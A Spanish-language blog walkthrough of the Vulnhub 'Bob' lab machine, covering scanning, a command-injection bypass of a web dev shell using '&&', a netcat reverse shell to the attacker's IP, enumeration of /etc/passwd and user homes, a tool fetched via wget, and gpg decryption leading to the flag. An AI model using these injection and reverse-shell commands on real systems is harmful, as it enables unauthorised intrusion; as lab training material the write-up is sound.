---
layout: post
title: "Bob Walkthrough"
author: "Pete"
---

Después del post previo con la resolución de una máquina, aprovechando que tenía un poco de tiempo, me puse con otra máquina de Vulnhub. Con cada máquina se aprende algo nuevo! 

La máquina en cuestión es Bob ([Vulnhub](https://www.vulnhub.com/entry/bob-101,226/)).

Seguimos los mismos pasos que en la [entrada anterior](https://livefromsec.github.io/2018-06-04/vulnhub_walkthrough_basic_pentesting).

# Preparación

Tenemos ya nuestra máquina Kali Linux, y tenemos que conocer la dirección de la máquina vulnerable. En el post anterior lo hacíamos comparando visualmente las salidas del comando arp-scan -l, pero en caso de que haya muchas máquinas en la red, tendremos que pasar un rato haciendo esa comparación, así que podemos hacerlo más fácil:

* _arp-scan -l > lista_antes_
* [Encendemos la máquina vulnerable]
* _arp-scan -l > lista_despues_
* _comm lista_antes lista_despues_

Así nos saldrá resaltada la máquina con su IP.

# Escaneo inicial

Una vez que conocemos la dirección IP, lanzamos nmap y vemos qué puertos/servicios tiene la máquina. Usamos los mismos flags que en post previo: -A, --reason y --top-ports.

El resultado: la máquina tiene un servidor web, y el archivo robots.txt ya nos da alguna pista de por dónde empezar a mirar.

![placeholder]({{ site.url }}/assets/img/0029_201080607_0001.png)

Pues nada, vamos a echarle un ojo a los sitios incluidos en el robots.txt

login.php, dev_shell.php, lat_memo.html y passwords.html

Miro primero en passwords.html... era muy bonito para ser real, los admin nos cuentan que antes alguien se despistó y puso las passwords, pero que ya se ha quitado.

![placeholder]({{ site.url }}/assets/img/0030_201080607_0002.png)

Miro en login.php, que da error, y en login.html que nos informa que está desactivada la página de login. Pues nada, en principio no habrá que forzar la inyección SQL en el formulario de login ;) Nos vamos a mirar la consola de desarrollo.

![placeholder]({{ site.url }}/assets/img/0031_201080607_0003.png)

# Consiguiendo la shell

Puede ejecutar comandos, así que vamos a ver si podemos abrirnos una shell con netcat...

![placeholder]({{ site.url }}/assets/img/0032_201080607_0004.png)

Hummmm... parece que el admin se lo ha tomado en serio. Pruebo todos los trucos de la [entrada pasada](https://livefromsec.github.io/2018-06-04/vulnhub_walkthrough_basic_pentesting), pero está todo filtrado.

Vamos a ver si con wget podemos descargar y ejecutar una shell en .php...

También está restringido. Pues nada, a ver si se pueden ejecutar dos comandos:
* pruebo separándolos con ";", y también está bloqueado (aunque da otro mensaje).
* pruebo concatenándolos, con "&&"... y funciona!

![placeholder]({{ site.url }}/assets/img/0033_201080607_0005.png)

Ahora sí, concatenamos id con un nc y tenemos nuestra shell:
* _id && nc -e /bin/sh 10.192.0.127 4444_

![placeholder]({{ site.url }}/assets/img/0034_201080607_0006.png)

Sacamos una shell con python:
* _python -c 'import pty; pty.spawn("/bin/sh")'_

![placeholder]({{ site.url }}/assets/img/0035_201080607_0007.png)

y nos ponemos a enumerar.

# Enumeración

En la descripción que daban en Vulnhub, se recomienda buscar ficheros ocultos, así que a la hora de listar ficheros usaré:
* _ls -la_

Le echo un ojo al /etc/passwd con 
* _cat /etc/passwd_

y veo que hay varios usuarios en el sistema: c0rruptedb1t, bob, jc, seb y elliot.
Y que uno de ellos, bob aparece como "Not the smartest person".

![placeholder]({{ site.url }}/assets/img/0036_201080607_0008.png)

Nos vamos al /home y vamos a ir enumerando.
* seb no tiene nada destacable en su home
* jc no tiene nada destacable en su home

![placeholder]({{ site.url }}/assets/img/0037_201080607_0009.png)

* elliot tiene un fichero llamado theadminisdumb.txt xD Este fichero nos da las credenciales de james (presumiblemente jc) y las suyas.
* bob es el que más cosas tiene: un fichero oculto llamado old_passwordfile.html, que tiene las credenciales de seb y las de jc. Además tiene 2 scripts en python (Hello_Again.py y Whell_Of_Fortune.py), un proftpd1.3.3 (versión backdorizada) y en su carpeta Documents tiene un documento poniendo a caldo a los demás (staff.txt), un fichero cifrado (login.txt.gpg) y un script que muestra unas notas en el escritorio.

![placeholder]({{ site.url }}/assets/img/0038_201080607_0010.png)

Entonces, recopilando, tenemos 3 credenciales (las de elliot, jc y seb); un documento diciendo que bob es el administrador y unos cuantos ficheros de bob.

# Escalada de privilegios

En la máquina de la [entrada anterior](https://livefromsec.github.io/2018-06-04/vulnhub_walkthrough_basic_pentesting) esto no era un problema, porque el servicio corría como root, por lo que al conseguir explotarlo nuestra shell era root.

Ahora tenemos que conseguir esa shell de root, con una escalada de privilegios (desde la cuenta de jc, seb o elliot, ya que tenemos sus credenciales). Vamos a ver qué kernel corre, por si tuviese vulnerabilidades conocidas:
* _uname -a_

![placeholder]({{ site.url }}/assets/img/0039_201080607_0011.png)

Está actualizado, así que mejor centrarse en otras opciones. Los scripts que había en python sugerían correrlos con sudo, pero ninguno de los usuarios para los que tenemos credenciales puede hacerlo; además no se pueden modificar y en el crontab no se les llama...

Miro a ver si netstat muestra algún puerto escuchando localmente:
* _netstat -ano_

¿Command not found? ¿Netstat? Investigando un poco, está obsoleto y su substituto es "ss". Algo nuevo que aprendemos con esta máquina :)
* _ss_

No muestra nada diferente.

En este punto podemos usar un script que revisa los principales puntos para hacer la escalada de privilegios en sistemas linux. Hay varios, yo voy a usar linuxprivchecker que para mí se convirtió en herramienta imprescindible cuando estaba haciendo el OSCP.

Lo descargamos en /tmp desde la máquina vulnerable con wget, sirviéndolo desde la máquina Kali con SimpleHTTP:
* _python -m SimpleHTTP 80_ [en la máquina Kali]
* _wget http://ip_de_kali/linuxprivchecker.py_ [en la máquina vulnerable]

![placeholder]({{ site.url }}/assets/img/0040_201080607_0012.png)

Lo ejecutamos:
* _python linuxprivchecker.py_

y viendo los resultados, a priori no hay nada que resalte mucho.

Así que toca hacer recapitulación... ¿qué tenemos? Las claves de 3 de los 4 usuarios, dos scripts en python que no hacen nada y que no están en el crontab, un fichero cifrado y un fichero que imprime frases absurdas en pantalla.

![placeholder]({{ site.url }}/assets/img/0041_201080607_0013.png)

**En este punto empezamos a sudar viendo que puede que la máquina se resuelva descifrando el fichero... lo que puede implicar "idea feliz".**

Pues nada, vamos a probar cosas para descifrar el fichero (mezcla de random y fuerza bruta). El comando [será](https://www.gnupg.org/gph/en/manual/x110.html):

* _gpg --output login.txt --decrypt login.txt.gpg_

![placeholder]({{ site.url }}/assets/img/0042_201080607_0014.png)

Vamos allá, a probar ideas felices: bob, james, seb, elliot... no, de momento no hemos acertado. En el fichero "notes.sh" había referencias a Harry Potter, vamos a probar: "Harry", "HarryPotter", "Gryffindor", etc. 

De momento, tampoco. Como no estamos en un examen, es el momento de pedir el comodín de la llamada. Más que nada, porque seguir probando combinaciones sin garantía puede ser un "rabbit hole" y pasar así un par de horas sin resultados.

Al descargar la máquina, también se muestra un enlace a un walkthrough; así que vamos a echarle un ojo, a ver cómo de lejos hemos llegado. Al mirarlo, vemos que la contraseña es la primera letra de cada frase: HARPOCRATES.

No comments ¬¬  podrían haber pasado horas y probablemente esa palabra no habría surgido en el brainstorm random de palabras, así que bien hecho está :)

# Flag

El siguiente paso es trivial, tenemos la clave de bob:

![placeholder]({{ site.url }}/assets/img/0043_201080607_0015.png)

Así que abrimos la sesión de bob, nos vamos a la raíz y hacemos:
* _sudo cat flag.txt_

![placeholder]({{ site.url }}/assets/img/0045_201080607_0017.png)

C'est fini :) Muy entretenido, aunque la parte de sacar la clave de cifrado gpg un poco de idea feliz :p
